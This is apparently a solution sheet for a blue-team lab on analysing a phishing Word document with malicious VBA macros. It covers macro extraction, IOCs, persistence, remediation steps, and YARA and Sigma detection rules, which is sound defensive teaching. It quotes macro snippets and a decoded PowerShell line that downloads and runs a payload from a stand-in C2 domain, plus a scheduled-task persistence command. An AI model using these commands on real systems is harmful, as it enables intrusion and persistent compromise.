# Lab 18: Phishing Document Analysis - Solution

## Answers to Challenge Questions

### Question 1: Does the document contain macros or malicious code?
**Answer:** Yes - Document contains malicious VBA macros

**Analysis:**
```bash
# Using olevba
$ olevba suspicious.docm

Keyword            | Occurrences | Description
------------------|-------------|--------------------------------------------
Shell              | 2           | Execute arbitrary commands
CreateObject       | 5           | Create COM objects
Exec               | 1           | Execute commands
WindowStyle        | 1           | Hidden execution
 Environ("TEMP")   | 2           | Access temp folder
```

**Macro found in `ThisDocument`:**
```vba
Sub Document_Open()
    Dim cmd As String
    cmd = "powershell -enc JABjAGwA..."
    Shell cmd, vbHide
End Sub
```

---

### Question 2: What actions does the macro perform?
**Answer:** The macro downloads and executes a payload from a remote server

**Actions:**
1. **Initial execution** - Runs on document open (AutoOpen/Document_Open)
2. **PowerShell execution** - Executes encoded PowerShell command
3. **Payload download** - Downloads additional malware from `malware-c2.xyz`
4. **Persistence** - Creates scheduled task for persistence
5. **Credential theft** - Attempts to steal saved credentials

**Full macro analysis:**
```vba
Sub Document_Open()
    ' Download and execute payload
    Set obj = CreateObject("WScript.Shell")
    obj.Run "powershell -enc JABjAGwA...", 0
    
    ' Create persistence
    obj.Run "schtasks /create /tn WindowsUpdate /tr ...""
End Sub

Function Document_Close()
    ' Keylogger activation
    ' Exfiltrates keystrokes to C2
End Function
```

---

### Question 3: What are the IOCs (Indicators of Compromise)?
**Answer:**

| Type | IOC | Defanged |
|------|-----|----------|
| Domain | malware-c2[.]xyz | malware-c2.xyz |
| IP | 185.234.219.10 | 185.234.219.10 |
| File Path | %TEMP%\payload.exe | - |
| Scheduled Task | WindowsUpdate | - |
| MD5 | 1234567890abcdef... | - |
| SHA256 | a1b2c3d4e5f6... | - |

---

### Question 4: How does it achieve persistence?
**Answer:** Scheduled task + Registry Run key

**Persistence Mechanism:**
1. **Scheduled Task:**
```bash
schtasks /create /tn WindowsUpdate /tr "powershell -enc ..." /sc daily
```

2. **Registry Run Key:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService
Value: "C:\Users\[user]\AppData\Local\Temp\payload.exe"
```

3. **Document Auto-open:**
```vba
Sub Document_Open()
    ' Automatically executes on document open
End Sub
```

---

### Question 5: What is the risk level?
**Answer:** **HIGH**

**Reasoning:**
- Executes code without user consent
- Downloads additional malware
- Achieves persistence
- Potential for credential theft
- Active C2 communication

---

## Analysis Tools and Commands

### Step 1: File Identification
```bash
# Get file hash
$ sha256sum suspicious.docm
a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456

# Check file type
$ file suspicious.docm
suspicious.docm: Microsoft Office Open XML Macro-Enabled Document
```

### Step 2: Macro Extraction
```bash
# Extract all macros
$ olevba suspicious.docm -t

# Extract to file
$ olevba suspicious.docm > macro_analysis.txt
```

### Step 3: Decode Obfuscated Strings
```bash
# Find encoded strings
$ strings suspicious.docm | grep -E "http|cmd|powershell|wscript"

# Decode base64 PowerShell
$ echo "JABjAGwA..." | base64 -d
[Net.ServicePointManager]::DefaultWebProxy = ...
IEX ((New-Object Net.WebClient).DownloadString('http://malware-c2.xyz/payload.ps1'))
```

### Step 4: OLE Stream Analysis
```bash
# List all streams
$ oledump.py suspicious.docm

# Extract specific stream
$ oledump.py -s 7 -d suspicious.docm > vba_module.bin
```

---

## Remediation Steps

### 1. Immediate Actions
- [ ] Isolate affected system from network
- [ ] Block C2 domain at firewall/DNS
- [ ] Scan endpoint for malware

### 2. Containment
- [ ] Remove scheduled task:
  ```bash
  schtasks /delete /tn WindowsUpdate /f
  ```
- [ ] Delete registry key:
  ```powershell
  Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService"
  ```
- [ ] Remove temp files:
  ```bash
  Remove-Item $env:TEMP\payload.exe -Force
  ```

### 3. Eradication
- [ ] Full system scan
- [ ] Reset all credentials
- [ ] Review and block indicators

### 4. Recovery
- [ ] Monitor affected accounts
- [ ] User security training
- [ ] Update email filters

---

## Detection Rules

### YARA Rule
```yara
rule Office_Macro_Downloader
{
    meta:
        author = "Blue Team Labs"
        description = "Detects Office documents with macro downloaders"
    strings:
        $vba1 = "Document_Open" fullword
        $vba2 = "CreateObject" fullword
        $vba3 = "Shell" fullword
        $ps1 = "DownloadString" fullword
        $ps2 = "-enc " nocase
    condition:
        any of them
}
```

### Sigma Rule
```yaml
title: Office Document Executes PowerShell
id: abc123-def456
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage: '*\\WINWORD.EXE'
    CommandLine|contains:
      - 'powershell'
      - '-enc'
  condition: selection
level: high
```

---

## IOC Summary

| Category | Value | Risk |
|----------|-------|------|
| Document Hash | a1b2c3... | Indicators |
| C2 Domain | malware-c2[.]xyz | Block at DNS |
| C2 IP | 185.234.219.10 | Block at Firewall |
| Scheduled Task | WindowsUpdate | Remove |
| Registry Key | HKCU\...\Run\UpdateService | Remove |

---

## References

- [oletools Documentation](https://github.com/decalage2/oletools)
- [Malicious Macro Analysis](https://www.sans.org/reading-room/whitepapers/malware/malicious-document-analysis-110)
- [YARA Documentation](https://virustotal.github.io/yara/)

---

**Back to:** [README.md](README.md)